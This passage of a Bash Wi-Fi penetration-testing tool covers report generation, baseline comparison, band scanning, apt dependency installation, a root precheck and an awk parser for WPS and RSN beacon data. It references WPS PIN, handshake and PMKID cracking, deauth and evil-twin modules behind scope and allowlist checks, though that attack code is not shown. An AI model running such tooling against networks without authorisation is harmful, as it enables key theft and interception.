		printf '<div class="rk" style="--c:%s"><div class="rk-n">%s</div><div class="rk-l"><span class="dot" style="background:%s"></span>Medium</div></div>' "$(_sev_color MEDIUM)" "$n_med" "$(_sev_color MEDIUM)"
		printf '<div class="rk" style="--c:%s"><div class="rk-n">%s</div><div class="rk-l"><span class="dot" style="background:%s"></span>Low</div></div>' "$(_sev_color LOW)" "$n_low" "$(_sev_color LOW)"
		printf '<div class="rk" style="--c:%s"><div class="rk-n">%s</div><div class="rk-l"><span class="dot" style="background:%s"></span>Info</div></div>' "$(_sev_color INFO)" "$n_info" "$(_sev_color INFO)"
		printf '</div><div class="donutwrap"><svg viewBox="0 0 160 160" width="160" height="160" role="img" aria-label="risk distribution">%s<text x="80" y="74" text-anchor="middle" class="donut-n">%s</text><text x="80" y="92" text-anchor="middle" class="donut-l">findings</text></svg>' \
			"$donut" "$((n_crit + n_high + n_med + n_low))"
		printf '<div class="legend"><div><span class="dot" style="background:%s"></span>Critical &nbsp;%s</div><div><span class="dot" style="background:%s"></span>High &nbsp;%s</div><div><span class="dot" style="background:%s"></span>Medium &nbsp;%s</div><div><span class="dot" style="background:%s"></span>Low &nbsp;%s</div></div></div></div>' \
			"$(_sev_color CRITICAL)" "$n_crit" "$(_sev_color HIGH)" "$n_high" "$(_sev_color MEDIUM)" "$n_med" "$(_sev_color LOW)" "$n_low"

		printf '<h2 class="sec">3. Key findings - 30 seconds</h2><div class="keys">'
		printf '<div class="key" style="--c:%s"><div class="t">Critical risk</div><div class="b">%s</div></div>' "$(_sev_color CRITICAL)" "$(_html_escape "$kf_crit")"
		printf '<div class="key" style="--c:%s"><div class="t">Main cause</div><div class="b">%s</div></div>' "$(_sev_color HIGH)" "$(_html_escape "$kf_cause")"
		printf '<div class="key" style="--c:%s"><div class="t">Scale</div><div class="b">%s</div></div>' "$(_sev_color MEDIUM)" "$(_html_escape "$kf_scale")"
		printf '<div class="key" style="--c:%s"><div class="t">First action</div><div class="b">%s</div></div>' "$(_sev_color LOW)" "$(_html_escape "$kf_first")"
		printf '</div>'

		printf '<h2 class="sec">4. Assets overview</h2><div class="panel" style="padding:0;overflow:hidden"><table><thead><tr><th>Severity</th><th>Network</th><th>BSSID</th><th>Channel</th><th>Security</th><th>Result</th></tr></thead><tbody>%s</tbody></table></div>' "$html_assets"

		printf '<h2 class="sec">5. Findings</h2>%s' "$html_findings"

		printf '<h2 class="sec">6. Remediation plan</h2><div class="panel" style="padding:0;overflow:hidden"><table><thead><tr><th>Priority</th><th>Action</th><th>Affected</th><th>Effort</th><th>Expected result</th></tr></thead><tbody>%s</tbody></table></div>' "$remed"

		printf '<h2 class="sec">7. Positive findings</h2><div class="panel"><ul class="pos">'
		printf '<li><span class="chk">&#10003;</span>%s</li>' "All listed networks use WPA2 encryption. No open or WEP network is in the results."
		printf '<li><span class="chk">&#10003;</span>%s</li>' "Every finding has a proof file hashed with SHA-256, so a third party can verify it."
		printf '<li><span class="chk">&#10003;</span>%s</li>' "Only in-scope networks were tested."
		printf '<li><span class="chk">&#10003;</span>%s</li>' "No active man-in-the-middle was run. Client isolation is reported as posture only."
		printf '</ul></div>'

		printf '<h2 class="sec">8. Evidence</h2><div class="panel" style="padding:0;overflow:hidden"><table><thead><tr><th>Type</th><th>File</th><th>SHA-256</th><th>Size</th></tr></thead><tbody>%s</tbody></table></div>' "$ev_rows"
		printf '<p class="sm sub" style="margin:8px 4px">Secrets are masked in the report body. The SHA-256 lets a third party check each proof file is unchanged. Keys are %s (REVEAL_CREDS=%s).</p>' \
			"$([[ "${REVEAL_CREDS:-0}" == "1" ]] && printf 'shown in the proof files' || printf 'masked')" "${REVEAL_CREDS:-0}"

		printf '<h2 class="sec">9. Methodology and limits</h2><div class="panel">'
		printf '<p style="margin-top:0"><b>Data.</b> Per-network facts from beacons (sar.jsonl), plus the attack results and the proof files.</p>'
		printf '<p><b>Checks.</b> WPS (pixie dust, vendor and default PIN, null/empty), WPA2 handshake / PMKID crack, PMF (802.11w) posture, WPA3 posture, client isolation posture (AirSnitch).</p>'
		printf '<p><b>Tools.</b> %s</p>' "$(_html_escape "$tools_txt")"
		printf '<p><b>Not tested.</b> No active man-in-the-middle, no client isolation exploit, no WPA3 downgrade, no networks outside the scan window or below the signal floor.</p>'
		printf '<p style="margin-bottom:0"><b>Limits.</b> WPS, PMF and encryption are read from beacons and can change. A no-crack result is not proof of a strong key. Client isolation is posture from facts, not an executed exploit.</p></div>'

		printf '<h2 class="sec">10. Final recommendations - top 5</h2><div class="panel"><ol class="top">'
		printf '<li>%s</li>' "Turn WPS off on all networks (PIN and push button)."
		printf '<li>%s</li>' "Change the wifi password on every cracked network now; the old keys are known."
		printf '<li>%s</li>' "Require PMF (802.11w) on every network."
		printf '<li>%s</li>' "Move to WPA3 SAE with a long random password."
		printf '<li>%s</li>' "Put guest and IoT on their own VLAN and SSID; block client to client at layer 3."
		printf '</ol></div>'

		printf '<div class="foot">%s v%s &middot; report v%s &middot; %s &middot; to save a PDF: open this file in a browser and use Print, Save as PDF (A4) &middot; refs: US-CERT VU#723755; AirSnitch NDSS 2026; MITRE ATT&amp;CK T1557/T1040; CWE-300/923/1392/326</div>' \
			"$(_html_escape "$TOOL_NAME")" "$(_html_escape "$VERSION")" "${REPORT_VERSION:-5}" "$(_html_escape "$now_dot")"

		printf '</div></body></html>'
	} >"${path_html}.tmp" 2>/dev/null || true
	# Atomic publish: only a fully written file becomes the report, and only
	# then is history updated — a failed/partial write never marks a network
	# reported, so it reappears next run instead of being lost.
	if [[ -s "${path_html}.tmp" ]]; then
		mv -f "${path_html}.tmp" "$path_html" 2>/dev/null || true
	else
		rm -f "${path_html}.tmp" 2>/dev/null || true
	fi
	chmod 600 "$path_html" 2>/dev/null || true

	if [[ "${ENABLE_REPORT_DEDUP:-1}" == "1" && -s "$path_html" && ${#_newset[@]} -gt 0 ]]; then
		report_state_add "${REPORT_STATE_VULN:-}" "${!_newset[@]}"
	fi

	print_log OK REPORT "Report: ${path_html##*/} (html; open in a browser, Print to PDF; nets=$n_ap keys=${#_creds_use[@]} crit=$n_crit high=$n_high)"
	return 0
}

function baseline_cli_save() {
	local output_path="${1:-}" input_path="${2:-}" record source_path=""
	if [[ -z "$output_path" ]]; then
		mkdir -p -- "$LOG_DIR" || return 1
		output_path="${LOG_DIR}/baseline_$(date +%Y%m%d_%H%M%S)_$$.jsonl"
	fi
	if [[ -n "$input_path" ]]; then
		source_path="$input_path"
	elif ((${#SAR_RECORDS[@]} > 0)); then
		: >"$output_path" || return 1
		for record in "${SAR_RECORDS[@]}"; do
			printf '%s\n' "$record" >>"$output_path" || return 1
		done
	elif [[ -r "${LOG_DIR}/sar.jsonl" ]]; then
		source_path="${LOG_DIR}/sar.jsonl"
	else
		return 1
	fi
	if [[ -n "$source_path" ]]; then
		[[ -r "$source_path" ]] || return 1
		if [[ "$source_path" == "$output_path" ]] || { [[ -e "$output_path" ]] && [[ "$source_path" -ef "$output_path" ]]; }; then
			print_log ERROR BASELINE "Input and output must differ"
			return 1
		fi
		cat -- "$source_path" >"$output_path" || return 1
	fi
	chmod 600 "$output_path" 2>/dev/null || true
	print_log OK BASELINE "Baseline saved: ${output_path##*/}"
}

function baseline_cli_compare() {
	local left="${1:-}" right="${2:-}" left_sum right_sum
	[[ -r "$left" && -r "$right" ]] || return 2
	left_sum=$(sha256sum -- "$left" 2>/dev/null | awk '{print $1}') || return 2
	right_sum=$(sha256sum -- "$right" 2>/dev/null | awk '{print $1}') || return 2
	if [[ "$left_sum" == "$right_sum" ]]; then
		print_log OK BASELINE "Baselines match"
		return 0
	fi
	print_log WARN BASELINE "Baselines differ"
	return 1
}

function scan_band() {
	local band="$1"
	local -a ch=() freqs=() bkey="" c f
	case "$band" in
	"2.4")
		ch=("${BAND_24[@]}")
		bkey=24
		;;
	"5")
		ch=("${BAND_5[@]}")
		bkey=5
		;;
	"6E")
		ch=("${BAND_6E_PSC[@]}")
		bkey=6
		;;
	*)
		print_log ERROR SCAN "Bad band: $band"
		return 1
		;;
	esac
	for c in "${ch[@]}"; do
		f=$(chan2freq "$bkey" "$c")
		if [[ -n "$f" ]]; then freqs+=("$f"); fi
	done
	ensure_mode "managed" || iface_set_type "managed" 2>/dev/null || true
	: >"${SCAN_RAW}.band" 2>/dev/null || true
	if ((${#freqs[@]} > 0)); then
		iface_do_scan_freq "${SCAN_RAW}.band" "${freqs[@]}"
	else
		iface_do_scan "${SCAN_RAW}.band"
	fi
	cat "${SCAN_RAW}.band" >>"$SCAN_RAW" 2>/dev/null || true
	rm -f "${SCAN_RAW}.band" 2>/dev/null || true
	print_log INFO BAND "$band: scan ${#freqs[@]} freqs"
	return 0
}

function _pkg_for() {
	case "$1" in
	iw) printf 'iw' ;;
	wpa_supplicant | wpa_cli) printf 'wpasupplicant' ;;
	pixiewps) printf 'pixiewps' ;;
	reaver) printf 'reaver' ;;
	bully) printf 'bully' ;;
	aircrack-ng | airodump-ng | aireplay-ng | airmon-ng | airgraph-ng) printf 'aircrack-ng' ;;
	hcxdumptool) printf 'hcxdumptool' ;;
	hcxpcapngtool) printf 'hcxtools' ;;
	tshark) printf 'tshark' ;;
	tcpdump) printf 'tcpdump' ;;
	gpsd) printf 'gpsd' ;;
	kismet) printf 'kismet' ;;
	giskismet) printf 'giskismet' ;;
	hashcat) printf 'hashcat' ;;
	hostapd-wpe) printf 'hostapd-wpe' ;;
	macchanger) printf 'macchanger' ;;
	nmcli) printf 'network-manager' ;;
	jq) printf 'jq' ;;
	*) printf '' ;;
	esac
}

# Auto-install missing dependencies.
# Sources: ONLY the OS's own configured, signed repositories via apt
# (Kali/Debian — the documented platform). No third-party repos, no
# curl|bash, no network fetch outside the package manager. Installs only
# the tools that are actually missing, and never aborts the run: any
# failure (no apt, not root, offline, package error) just logs and
# continues — every module is already fail-safe when its tool is absent.
function auto_install_deps() {
	if ! command -v apt-get >/dev/null 2>&1; then
		print_log INFO INSTALL "No apt; skip"
		return 0
	fi
	if [[ $EUID -ne 0 ]]; then
		print_log WARN INSTALL "Need root"
		return 0
	fi

	local cmds=(iw wpa_supplicant wpa_cli pixiewps reaver bully
		aircrack-ng airodump-ng aireplay-ng airgraph-ng
		hcxdumptool hcxpcapngtool tshark tcpdump gpsd
		macchanger hashcat jq)

	local -A want=()
	local c pkg
	for c in "${cmds[@]}"; do
		if command -v "$c" >/dev/null 2>&1; then continue; fi
		pkg="$(_pkg_for "$c")"
		[[ -n "$pkg" ]] || continue
		want["$pkg"]=1
	done

	if ((${#want[@]} == 0)); then
		print_log INFO INSTALL "All present"
		return 0
	fi

	local -a pkgs=("${!want[@]}")
	print_log INFO INSTALL "Add: ${pkgs[*]}"

	if [[ "${ENABLE_DRY_RUN:-0}" == "1" ]]; then
		print_log INFO INSTALL "Dry-run: skip"
		return 0
	fi

	export DEBIAN_FRONTEND=noninteractive
	timeout "${INSTALL_UPDATE_TIMEOUT:-120}" apt-get update >/dev/null 2>&1 ||
		print_log WARN INSTALL "Update failed"
	timeout "${INSTALL_TIMEOUT:-600}" apt-get install -y --no-install-recommends "${pkgs[@]}" >/dev/null 2>&1 ||
		print_log WARN INSTALL "Some failed"

	local -a still=()
	for c in "${cmds[@]}"; do
		command -v "$c" >/dev/null 2>&1 || still+=("$c")
	done
	if ((${#still[@]} > 0)); then
		print_log WARN INSTALL "Missing: ${still[*]}"
	else
		print_log OK INSTALL "Deps ready"
	fi
	return 0
}

function run_precheck() {
	validate_env
	if [[ $EUID -ne 0 ]]; then
		print_log ERROR FATAL "Need root"
		exit 1
	fi
	if ! ip link show "$IFACE" &>/dev/null; then
		print_log ERROR FATAL "No iface: $IFACE"
		exit 1
	fi

	local c
	for c in ip iw wpa_supplicant wpa_cli pixiewps reaver awk sort grep sed tr timeout flock mktemp sha256sum; do
		if ! command -v "$c" &>/dev/null; then
			print_log ERROR FATAL "Missing: $c"
			exit 1
		fi
	done
	for c in macchanger bully nmcli airodump-ng aireplay-ng hcxdumptool hcxpcapngtool tcpdump hostapd-wpe hashcat aircrack-ng; do
		if ! command -v "$c" &>/dev/null; then
			print_log WARN INIT "Optional missing: $c"
		fi
	done
	if [[ "${ENABLE_OFFLINE_CRACK:-1}" == "1" ]] && ! command -v hashcat &>/dev/null && ! command -v aircrack-ng &>/dev/null; then
		print_log WARN INIT "Offline crack on: no hashcat or aircrack-ng — captures will not reach Confirmed"
	fi
	if [[ "${ENABLE_DEFAULTKEY_GEN:-1}" == "1" && -z "${DEFAULTKEY_GEN_CMD:-}" && -z "${DEFAULTKEY_WORDLIST:-}" ]]; then
		print_log INFO INIT "No wordlist (common passwords by default)"
	fi

	TMP_DIR="$(mktemp -d "${TMPDIR:-/tmp}/${TOOL_NAME}.XXXXXX")" || {
		print_log ERROR FATAL "Temp dir failed"
		exit 1
	}

	if ! mkdir -p -- "$LOG_DIR"; then
		print_log ERROR FATAL "Cannot create log dir"
		exit 1
	fi
	chmod 700 "$LOG_DIR" 2>/dev/null || true

	[[ -n "$HASH_DIR" ]] || HASH_DIR="${LOG_DIR}/proof"
	mkdir -p -- "$HASH_DIR" 2>/dev/null || HASH_DIR="$LOG_DIR"
	chmod 700 "$HASH_DIR" 2>/dev/null || true
	print_log INFO INIT "Proof dir: $HASH_DIR"

	LOG_SESSION="${TMP_DIR}/session.log"
	LOG_AUDIT="${LOG_DIR}/cp_audit.log"
	WPS_CONF="${TMP_DIR}/wpa_supplicant.conf"
	WPS_LOG="${TMP_DIR}/wpa_supplicant.log"
	SCAN_RAW="${TMP_DIR}/raw_scan.txt"
	SCAN_TARGETS="${TMP_DIR}/targets.tsv"
	LOCK_FILE="${TMP_DIR}/lockouts.txt"
	KNOWN_FILE="${LOG_DIR}/known_bssids.txt"
	PROCESSED_FILE="${LOG_DIR}/processed_bssids.txt"
	[[ -e "$PROCESSED_FILE" ]] || : >"$PROCESSED_FILE" 2>/dev/null || true

	REPORT_STATE_RECON="${LOG_DIR}/recon_reported.txt"
	REPORT_STATE_VULN="${LOG_DIR}/vuln_reported.txt"
	if [[ "${ENABLE_REPORT_DEDUP:-1}" == "1" ]]; then
		report_state_init
	fi

	if ! {
		: >"$LOG_SESSION"
		: >"$LOG_AUDIT"
		: >"$LOCK_FILE"
		: >"${TMP_DIR}/lock_counts.txt"
	}; then
		print_log ERROR FATAL "Cannot create work files"
		exit 1
	fi

	allowlist_init_active
	eviltwin_allowlist_init

	if command -v nmcli &>/dev/null; then
		nmcli dev set "$IFACE" managed no 2>/dev/null || true
	fi
	iw reg set "$REG_DOMAIN" 2>/dev/null || true

	ORIGINAL_MAC="$(iface_get_mac)" || ORIGINAL_MAC=""
	RESTORE_TYPE="$(iface_get_type)" || RESTORE_TYPE="managed"
	[[ -n "$RESTORE_TYPE" ]] || RESTORE_TYPE="managed"
	CURRENT_MODE="$RESTORE_TYPE"

	if [[ "${ENABLE_TRACE_RULES:-0}" == "1" ]]; then
		RULE_TRACE_FILE="${LOG_DIR}/rule_trace.log"
		if ! : >"$RULE_TRACE_FILE"; then
			RULE_TRACE_FILE=""
			print_log WARN INIT "Trace file failed"
		fi
	fi

	local _scope_lbl="all (authorized)" _mode_lbl="passive"
	[[ "${SCOPE_ALL_AUTHORIZED:-0}" != "1" && -n "${SCOPE_ESSID_PREFIX:-}" ]] && _scope_lbl="essid ${SCOPE_ESSID_PREFIX}*"
	[[ "${SCOPE_ALL_AUTHORIZED:-0}" != "1" && -z "${SCOPE_ESSID_PREFIX:-}" ]] && _scope_lbl="allowlist"
	[[ "${ENABLE_DEAUTH:-0}" == "1" || "${ENABLE_PMKID_ACTIVE:-0}" == "1" || "${ENABLE_EVILTWIN:-0}" == "1" ]] && _mode_lbl="active"
	print_log INFO START "$TOOL_NAME v$VERSION  iface=$IFACE  rssi>=${RSSI_ATTACK_MIN:-any}"
		if [[ "${SCOPE_ALL_AUTHORIZED:-0}" == "1" ]]; then
		print_log WARN LEGAL "All scope"
	else
		print_log WARN LEGAL "Scope only"
	fi
}

function parse_scan() {
	local raw="$1" out="$2"
	if [[ -z "$raw" || -z "$out" ]]; then return 1; fi
	: >"$out" 2>/dev/null || return 1
	if [[ ! -r "$raw" || ! -s "$raw" ]]; then return 0; fi

	awk '
function hex2dec(h, v,i,c,len){v=0;h=tolower(h);sub(/^0x/,"",h);len=length(h);for(i=1;i<=len;i++){c=substr(h,i,1);if(c~/[0-9]/)v=v*16+c;else if(c=="a")v=v*16+10;else if(c=="b")v=v*16+11;else if(c=="c")v=v*16+12;else if(c=="d")v=v*16+13;else if(c=="e")v=v*16+14;else if(c=="f")v=v*16+15}return v}
function bit_or(a,b, res,i,ba,bb){res=0;for(i=0;i<24;i++){ba=int(a/(2^i))%2;bb=int(b/(2^i))%2;if(ba||bb)res+=2^i}return res}
function set_cm(bit){cfg_methods=sprintf("0x%04x",bit_or(hex2dec(cfg_methods),bit))}
function freq2chan(f){f=f+0;if(f>=2400&&f<3000)return int((f-2407)/5);if(f>=5000&&f<5900)return int((f-5000)/5);if(f>=5950)return int((f-5950)/5);return 1}
function map_dpid(raw, n){
gsub(/^[[:space:]]+|[[:space:]]+$/,"",raw)
if(raw=="")return "unknown"
if(raw~/^0[xX][0-9a-fA-F]+$/)n=hex2dec(raw)
else if(raw~/^[0-9]+$/)n=raw+0
else return "unknown"
if(n==0)return "default"; if(n==1)return "user"; if(n==2)return "machine"; if(n==3)return "rekey"
if(n==4)return "pushbutton"; if(n==5)return "registrar"; if(n==6)return "ibss"
if(n==7)return "nfc_handover"; if(n==8)return "wfds"
if(n>=16&&n<=65535)return "oob_token"
return "unknown"
}
function trimfield(s){gsub(/^[[:space:]]+|[[:space:]]+$/,"",s);return s}
function akm_add(t){if(t=="")return;if(akm_list=="")akm_list=t;else if((","akm_list",")!~(","t","))akm_list=akm_list","t}
function cipher_add(which,t){
if(t==""||t=="*")return
if(which=="gw"){if(rsn_gw=="")rsn_gw=t;else if((","rsn_gw",")!~(","t","))rsn_gw=rsn_gw","t}
else if(which=="pw"){if(rsn_pw=="")rsn_pw=t;else if((","rsn_pw",")!~(","t","))rsn_pw=rsn_pw","t}
else if(which=="gm"){if(rsn_gm=="")rsn_gm=t;else if((","rsn_gm",")!~(","t","))rsn_gm=rsn_gm","t}
if(t=="TKIP")tkip="YES"
}
function rsnxe_add(t){if(t=="")return;if(rsnxe_list=="")rsnxe_list=t;else if((","rsnxe_list",")!~(","t","))rsnxe_list=rsnxe_list","t}
function extcap_add(t){if(t=="")return;if(extcap_list=="")extcap_list=t;else if((","extcap_list",")!~(","t","))extcap_list=extcap_list","t}
function bit_set(v,b, i,x){x=v+0;for(i=0;i<b;i++)x=int(x/2);return x%2}
function rsnxe_canon(t, tl){
tl=tolower(t); gsub(/[[:space:]]+/,"-",tl); gsub(/_/,"-",tl)
if(tl~/sae-?hash-?to-?element|sae-?h2e/)return "SAE-H2E"
if(tl~/^sae-?pk$/||tl~/sae-?public-?key/)return "SAE-PK"
if(tl~/protected-?twt|prot-?twt/)return "Prot-TWT"
if(tl~/secure-?ltf/)return "Secure-LTF"
if(tl~/secure-?rtt/)return "Secure-RTT"
if(tl~/urnm-?mfpr-?x20/)return "URNM-MFPR-X20"
if(tl~/urnm-?mfpr/)return "URNM-MFPR"
if(tl~/prot(ected)?-?range|range-?neg/)return "Prot-Range-Neg"
if(tl~/trans(ition)?-?disable/)return "Trans-Disable"
if(tl~/frag-?cache-?clear|clear-?frag(ment)?-?cache/)return "FRAG-CACHE-CLEAR"
if(tl~/frag-?agg-?disable|spp-?a-?msdu|spp_amsdu/)return "FRAG-AGG-DISABLE"
if(tl~/frag-?cache-?attack|frag(mentation)?-?cache-?mitig/)return "FRAG-CACHE-ATTACK"
return t
}
function rsnxe_named_bit(b){
return (b==4||b==5||b==6||b==8||b==9||b==10||b==15)
}
function rsnxe_decode_cap(hx, c,b,tmp,maxb,hxn){
hxn=tolower(hx); if(hxn!~/^0x/)hxn="0x" hxn
rsnxe_add("CAP:" hxn)
if(rsnxe_cap_hex=="")rsnxe_cap_hex=hxn
c=hex2dec(hx)
if(bit_set(c,4))rsnxe_add("Prot-TWT")
if(bit_set(c,5))rsnxe_add("SAE-H2E")
if(bit_set(c,6))rsnxe_add("SAE-PK")
if(bit_set(c,8))rsnxe_add("Secure-LTF")
if(bit_set(c,9))rsnxe_add("Secure-RTT")
if(bit_set(c,10)){rsnxe_add("URNM-MFPR-X20"); rsnxe_add("Prot-Range-Neg")}
if(bit_set(c,15))rsnxe_add("URNM-MFPR")
maxb=16; tmp=c+0; b=0; while(tmp>0){b++;tmp=int(tmp/2)} if(b>maxb)maxb=b
for(b=4;b<maxb;b++){
if(!bit_set(c,b))continue
if(rsnxe_named_bit(b))continue
rsnxe_add("BIT:" b)
}
}
function is_mac(s,  t,c){if(s!~/^[0-9a-fA-F:]+$/)return 0;t=s;c=gsub(/:/,"@",t);return c==5}
function reset(){bssid="";essid="";sig="";wps_on=0;ver="unknown";ap_locked="NO";sel_reg="NO";wpa3="NO";pmf="NO";dpp="NO";wps_hidden="NO";wps_state="unknown";cfg_methods="0x0000";tkip="NO";wpa1="NO";dpp_on=0;dpp_ver="unknown";dpp_conf="NO";dpp_pkex="NO";psk="NO";owe="NO";freq="";dpid="unknown";maker="";model="";fw="";devname="";serial="";uuid="";channel=1;rsn_caps="NO";akm_list="";rsn_gw="";rsn_pw="";rsn_gm="";rsnxe_list="";rsnxe_cap_hex="";extcap_list="";owe_tm="NO";td_bitmap="";in_rsn=0;in_rsnxe=0;in_extcap=0;in_wps=0;in_legacy_wpa=0;in_he_cap=0;in_he_op=0;he_present="";he_capabilities_present="";he_operation_present="";he_bss_color="";he_twt_supported="";he_ul_mu_mimo="";he_dl_mu_mimo="";he_ul_ofdma="";he_dl_ofdma="";he_160mhz="";he_80p80="";he_spatial_streams="";he_raw_capabilities_hex="";he_mac_hex="";he_phy_hex="";he_ss_max=0;in_eht_cap=0;in_eht_op=0;eht_present="";eht_capabilities_present="";eht_operation_present="";eht_320mhz="";eht_puncturing_supported="";eht_mlo_supported="";eht_mlo_ap="";eht_spatial_streams="";eht_mcs_max="";eht_raw_capabilities_hex="";eht_mac_hex="";eht_phy_hex="";eht_ss_max=0;eht_mcs_hi=0}
function row(){if(he_ss_max>0)he_spatial_streams=he_ss_max ""; if(he_mac_hex!=""||he_phy_hex!=""){he_raw_capabilities_hex=""; if(he_mac_hex!="")he_raw_capabilities_hex="MAC:" he_mac_hex; if(he_phy_hex!=""){if(he_raw_capabilities_hex!="")he_raw_capabilities_hex=he_raw_capabilities_hex ";"; he_raw_capabilities_hex=he_raw_capabilities_hex "PHY:" he_phy_hex}} if(eht_ss_max>0)eht_spatial_streams=eht_ss_max ""; if(eht_mcs_hi>0)eht_mcs_max=eht_mcs_hi ""; if(eht_mac_hex!=""||eht_phy_hex!=""){eht_raw_capabilities_hex=""; if(eht_mac_hex!="")eht_raw_capabilities_hex="MAC:" eht_mac_hex; if(eht_phy_hex!=""){if(eht_raw_capabilities_hex!="")eht_raw_capabilities_hex=eht_raw_capabilities_hex ";"; eht_raw_capabilities_hex=eht_raw_capabilities_hex "PHY:" eht_phy_hex}} return bssid"\036"essid"\036"sig"\036"ver"\036"ap_locked"\036"sel_reg"\036"wpa3"\036"pmf"\036"dpp"\036"wps_hidden"\036"wps_state"\036"cfg_methods"\036"tkip"\036"wpa1"\036"dpp_ver"\036"dpp_conf"\036"dpp_pkex"\036"psk"\036"owe"\036"channel"\036"dpid"\036"maker"\036"model"\036"fw"\036"devname"\036"serial"\036"uuid"\036"rsn_caps"\036"akm_list"\036"rsn_gw"\036"rsn_pw"\036"rsn_gm"\036"rsnxe_list"\036"extcap_list"\036"owe_tm"\036"td_bitmap"\036"rsnxe_cap_hex"\036"he_present"\036"he_capabilities_present"\036"he_operation_present"\036"he_bss_color"\036"he_twt_supported"\036"he_ul_mu_mimo"\036"he_dl_mu_mimo"\036"he_ul_ofdma"\036"he_dl_ofdma"\036"he_160mhz"\036"he_80p80"\036"he_spatial_streams"\036"he_raw_capabilities_hex"\036"eht_present"\036"eht_capabilities_present"\036"eht_operation_present"\036"eht_320mhz"\036"eht_puncturing_supported"\036"eht_mlo_supported"\036"eht_mlo_ap"\036"eht_spatial_streams"\036"eht_mcs_max"\036"eht_raw_capabilities_hex}
function emit(){
if(bssid!=""&&is_mac(bssid)&&(wps_on||dpp_on)){
if(essid==""){essid="<hidden>";wps_hidden="YES"}
if(freq!="")channel=freq2chan(freq)
if(!(bssid in best) || sig+0 > bestsig[bssid]+0){best[bssid]=row();bestsig[bssid]=sig+0}
}
reset()
}
BEGIN{reset()}
/^BSS /{emit();bssid=$2;sub(/[(].*/,"",bssid);gsub(/[^0-9a-fA-F:]/,"",bssid)}
/^\tSSID:[[:space:]]/{ln=$0;sub(/.*SSID:[[:space:]]+/,"",ln);if(ln!=""&&essid=="")essid=ln}
/^\tsignal:[[:space:]]/{ln=$0;sub(/.*signal:[[:space:]]+/,"",ln);sub(/[[:space:]].*$/,"",ln);sig=ln}
/^\tfreq:[[:space:]]/{freq=$2}
/^\tWPS:/{wps_on=1;in_wps=1}
in_wps&&/^[[:space:]]*\*[[:space:]]*Version2:/&&$0~/2\.0/{ver="2.0"}
in_wps&&/^[[:space:]]*\*[[:space:]]*Version:/&&$0!~/Version2:/&&$0~/1\.0/&&ver!="2.0"{ver="1.0"}
in_wps&&/[Ww]i-[Ff]i [Pp]rotected [Ss]etup [Ss]tate:/{if($0~/[Cc]onfigured/)wps_state="configured";else if($0~/[Nn]ot [Cc]onfigured/)wps_state="not_configured"}
in_wps&&/[Dd]evice [Pp]assword [Ii][Dd]:/{ln=$0;sub(/.*[Dd]evice [Pp]assword [Ii][Dd]:[[:space:]]*/,"",ln);split(ln,a,/[[:space:]]+/);if(a[1]!="")dpid=map_dpid(a[1])}
in_wps&&/[Cc]onfig [Mm]ethods:/{if(match($0,/0x[0-9a-fA-F]+/))cfg_methods=substr($0,RSTART,RLENGTH)}
in_wps&&/[Vv]irtual[ ]?[Dd]isplay/{set_cm(0x0200)}
in_wps&&/[Pp]hysical[ ]?[Dd]isplay/{set_cm(0x0400)}
in_wps&&/[Vv]irtual[ ]?[Kk]eypad/{set_cm(0x0800)}
in_wps&&/[Pp]hysical[ ]?[Kk]eypad/{set_cm(0x1000)}
in_wps&&/[Vv]irtual[ ]?[Pp]ush[ ]?[Bb]utton/{set_cm(0x2000)}
in_wps&&/[Pp]hysical[ ]?[Pp]ush[ ]?[Bb]utton/{set_cm(0x4000)}
in_wps&&/[Dd]isplay/&&$0!~/[Vv]irtual/&&$0!~/[Pp]hysical/{set_cm(0x0008)}
in_wps&&/[Kk]eypad/&&$0!~/[Vv]irtual/&&$0!~/[Pp]hysical/{set_cm(0x0100)}
in_wps&&/[Pp]ush[ ]?[Bb]utton/&&$0!~/[Vv]irtual/&&$0!~/[Pp]hysical/{set_cm(0x0080)}
in_wps&&/[Ll]abel/{set_cm(0x0004)}
in_wps&&/[Uu][Ss][Bb][Aa]?/&&$0!~/USBA?=/{set_cm(0x0001)}
in_wps&&/[Ee]thernet/{set_cm(0x0002)}
in_wps&&/[Ee]xt(\.|ernal)?[ ]?NFC/{set_cm(0x0010)}
in_wps&&/[Ii]nt(\.|egrated)?[ ]?NFC/{set_cm(0x0020)}
in_wps&&/NFC[ ]?(Intf|Interface)/{set_cm(0x0040)}
/^[\t ]*WPA:[[:space:]]*$/{in_legacy_wpa=1;in_rsn=0;in_rsnxe=0;in_extcap=0;wpa1="YES";next}
/^[\t ]*RSN:/{in_legacy_wpa=0;in_rsn=1;in_rsnxe=0;in_extcap=0}
/^[\t ]*RSNXE?:/||/^[\t ]*RSNX:/{in_legacy_wpa=0;in_rsn=0;in_rsnxe=1;in_extcap=0}
/^[\t ]*Extended [Cc]apabilities:/{
in_legacy_wpa=0;in_rsn=0;in_rsnxe=0;in_extcap=1
ln=$0; sub(/.*[Ee]xtended [Cc]apabilities:[[:space:]]*/,"",ln)
if(ln!=""){
n=split(ln,a,/,/)
for(i=1;i<=n;i++){
t=a[i]; gsub(/^[[:space:]]+|[[:space:]]+$/,"",t)
if(t=="")continue
if(t~/^[0-9]+$/)extcap_add("BIT:" t)
else{gsub(/[[:space:]]+/,"_",t);extcap_add(t)}
}
}
}
/^\t[A-Za-z]/&&!/^\tRSN:/{in_rsn=0}
/^\t[A-Za-z]/&&!/^\tRSNX/{in_rsnxe=0}
/^\t[A-Za-z]/&&!/^\tExtended [Cc]apabilities:/{in_extcap=0}
in_rsnxe&&/^[[:space:]]*\*/{
ln=$0; sub(/^[[:space:]]*\*[[:space:]]*/,"",ln)
if(ln~/[Cc]apabilities:/||ln~/[Ee]xtended[[:space:]]+[Rr][Ss][Nn][[:space:]]+[Cc]apabilities:/){
if(match(ln,/0[xX][0-9a-fA-F]+/))rsnxe_decode_cap(substr(ln,RSTART,RLENGTH))
} else if(ln!=""){
gsub(/,/,"_",ln); rsnxe_add(rsnxe_canon(ln))
if(ln~/[Tt]ransition[_[:space:]-]*[Dd]isable/){rsnxe_add("Trans-Disable")}
}
}
in_rsn&&/[Cc]apabilities:/{
rsn_caps="YES"
if(match($0,/0[xX][0-9a-fA-F]+/)){
c=hex2dec(substr($0,RSTART,RLENGTH))
if(int(c/64)%2==1)pmf="REQUIRED"
else if(int(c/128)%2==1&&pmf=="NO")pmf="CAPABLE"
if(bit_set(c,10)||bit_set(c,11))rsnxe_add("FRAG-AGG-DISABLE")
}
}
in_legacy_wpa&&/TKIP/{tkip="YES"}
/Pairwise ciphers:.*TKIP/||/Group cipher:.*TKIP/{tkip="YES"}
in_rsn&&/[Gg]roup [Mm]gmt [Cc]ipher:/{
